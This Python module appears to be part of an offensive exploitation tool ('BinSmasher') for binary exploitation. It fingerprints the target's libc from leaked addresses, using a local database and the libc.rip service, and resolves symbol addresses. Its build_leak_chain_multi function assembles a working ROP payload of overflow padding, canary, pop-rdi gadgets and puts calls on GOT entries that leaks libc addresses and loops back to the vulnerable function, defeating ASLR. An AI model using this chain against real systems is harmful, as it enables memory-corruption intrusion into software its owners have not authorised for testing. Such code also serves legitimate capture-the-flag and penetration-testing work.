"""
Multi-symbol libc fingerprinting.

Leaking a single symbol is ambiguous — many libcs share the same
page offset for puts, for example. Leaking 3+ symbols simultaneously
and matching against the database gives near-certain identification.
"""
from __future__ import annotations
import logging
from analyzer.libc_db import LIBC_DB, lookup_by_symbol

log = logging.getLogger("binsmasher")


def fingerprint_libc(leaked: dict[str, int]) -> list[dict]:
    """
    Given a dict of { symbol_name: leaked_addr }, find all matching libcs.

    Example:
        leaked = {
            "puts":                 0x7f1234567890,
            "__libc_start_main":    0x7f1234512345,
            "printf":               0x7f1234523456,
        }
        matches = fingerprint_libc(leaked)
        # → [{ libc_key, libc_base, confidence, offsets }, ...]

    Returns matches sorted by confidence (highest first).
    """
    if not leaked:
        return []

    # Find candidates from each symbol independently
    candidates: dict[str, set[str]] = {}  # libc_key → set of matching symbols
    bases: dict[str, dict[str, int]] = {}  # libc_key → { sym: computed_base }

    for sym, addr in leaked.items():
        matches = lookup_by_symbol(sym, addr)
        for m in matches:
            key = m["libc_key"]
            base = m["libc_base"]
            if key not in candidates:
                candidates[key] = set()
                bases[key] = {}
            candidates[key].add(sym)
            bases[key][sym] = base

    # Score: libc_key where all leaked symbols agree on the same base
    results = []
    for key, matched_syms in candidates.items():
        if len(matched_syms) < 1:
            continue

        # Check that all symbols give the same libc_base
        computed_bases = list(bases[key].values())
        if len(set(computed_bases)) > 1:
            # Inconsistent bases — different symbols give different libc_base
            # This libc is not a match
            log.debug(f"[fingerprint] {key}: inconsistent bases {[hex(b) for b in computed_bases]}")
            continue

        libc_base = computed_bases[0]
        confidence = len(matched_syms) / len(leaked)  # 0.0–1.0

        results.append({
            "libc_key":   key,
            "libc_base":  libc_base,
            "confidence": confidence,
            "matched":    list(matched_syms),
            "offsets":    LIBC_DB.get(key, {}),
        })
        log.info(f"[fingerprint] {key}: base={hex(libc_base)} "
                 f"confidence={confidence:.0%} matched={list(matched_syms)}")

    # Sort by confidence then by number of matched symbols
    results.sort(key=lambda r: (r["confidence"], len(r["matched"])), reverse=True)
    return results


def resolve_libc_multisym(leaked: dict[str, int],
                           libc_path: str | None = None) -> dict | None:
    """
    Full pipeline: multi-symbol fingerprint → resolve all offsets.

    1. Try local DB with all leaked symbols
    2. If local DB gives no high-confidence match, query libc.rip with multiple symbols
    3. Fall back to single-symbol resolution

    Returns { symbol: absolute_addr, ... } or None.
    """
    # 1. Local multi-symbol fingerprint
    matches = fingerprint_libc(leaked)
    if matches and matches[0]["confidence"] >= 0.5:
        best = matches[0]
        base = best["libc_base"]
        offs = best["offsets"]
        absolute = {k: base + v for k, v in offs.items()}
        absolute["__libc_base__"] = base
        absolute["_libc_key"] = best["libc_key"]
        absolute["_confidence"] = best["confidence"]
        log.info(f"[fingerprint] Resolved via local DB: {best['libc_key']} "
                 f"confidence={best['confidence']:.0%}")
        return absolute

    # 2. Query libc.rip with multiple symbols
    try:
        import urllib.request, json as _json
        # Build query with all leaked symbols' page offsets
        sym_params = "&".join(
            f"symbols={sym}={hex(addr & 0xfff)}"
            for sym, addr in leaked.items()
        )
        url = f"https://libc.rip/api/v1/find?{sym_params}"
        req = urllib.request.Request(url, headers={"User-Agent": "BinSmasher/4"})
        with urllib.request.urlopen(req, timeout=8) as r:
            results = _json.loads(r.read())

        if results:
            # Use first leaked symbol to compute base
            first_sym = next(iter(leaked))
            first_addr = leaked[first_sym]
            best = results[0]
            sym_off = int(best["symbols"].get(first_sym, "0"), 16)
            if sym_off:
                base = first_addr - sym_off
                absolute = {k: base + int(v, 16)
                            for k, v in best["symbols"].items()}
                absolute["__libc_base__"] = base
                absolute["_libc_key"] = best.get("id", "libc.rip")
                absolute["_confidence"] = 1.0  # libc.rip multi-symbol is definitive
                log.info(f"[fingerprint] libc.rip multi-sym: {best.get('id')} "
                         f"base={hex(base)}")
                return absolute
    except Exception as e:
        log.debug(f"[fingerprint] libc.rip multi-sym: {e}")

    # 3. Fall back to single-symbol resolution
    from analyzer.libc_db import resolve_from_leak
    for sym, addr in leaked.items():
        result = resolve_from_leak(sym, addr, libc_path)
        if result:
            result["_confidence"] = 0.3  # single symbol, lower confidence
            log.info(f"[fingerprint] fallback single-sym: {sym}={hex(addr)}")
            return result

    log.warning(f"[fingerprint] Could not identify libc from {len(leaked)} symbols")
    return None


def build_leak_chain_multi(elf, rop, offset: int, canary: int | None,
                            n_symbols: int = 3) -> tuple[bytes, list[str]]:
    """
    Build a ROP chain that leaks N GOT entries in a single connection.

    Uses a gadget loop: puts(got[A]) → puts(got[B]) → puts(got[C]) → ret2vuln

    Returns (payload_bytes, [list_of_symbol_names_leaked_in_order])
    """
    from pwn import p64, context

    if context.arch != "amd64":
        # Single leak only for non-amd64
        return b"", []

    leak_targets = [
        sym for sym in ("__libc_start_main", "puts", "printf",
                         "read", "write", "malloc", "free", "setvbuf")
        if sym in elf.got and sym in elf.plt
    ][:n_symbols]

    if not leak_targets or "puts" not in elf.plt:
        return b"", []

    packer = p64
    word = 8
    cv = packer(canary) if canary else b""
    pad = b"B" * word

    try:
        pop_rdi = rop.find_gadget(["pop rdi", "ret"])
        ret_g   = rop.find_gadget(["ret"])
    except Exception:
        return b"", []

    if not pop_rdi:
        return b"", []

    vuln_addr = (elf.symbols.get("vuln") or
                 elf.symbols.get("main") or elf.entry)

    chain = b"A" * offset + cv + pad
    if ret_g:
        chain += p64(ret_g[0])  # stack alignment

    for sym in leak_targets:
        chain += (p64(pop_rdi[0])
                  + p64(elf.got[sym])
                  + p64(elf.plt["puts"]))

    chain += p64(vuln_addr)  # loop back

    log.info(f"[fingerprint] Multi-leak chain: {len(chain)}B "
             f"leaks={leak_targets}")
    return chain, leak_targets


def parse_multi_leak(raw: bytes, symbols: list[str]) -> dict[str, int]:
    """
    Parse the output of a multi-symbol leak chain.
    puts() outputs addr\n for each symbol.
    """
    from pwn import u64
    leaked = {}
    parts = raw.split(b"\n")

    for i, sym in enumerate(symbols):
        if i >= len(parts):
            break
        chunk = parts[i]
        if len(chunk) >= 6:
            val = u64(chunk[:8].ljust(8, b"\x00"))
            if 0x7f0000000000 <= val <= 0x7fffffffffff:
                leaked[sym] = val
                log.info(f"[fingerprint] Leaked {sym}: {hex(val)}")

    return leaked
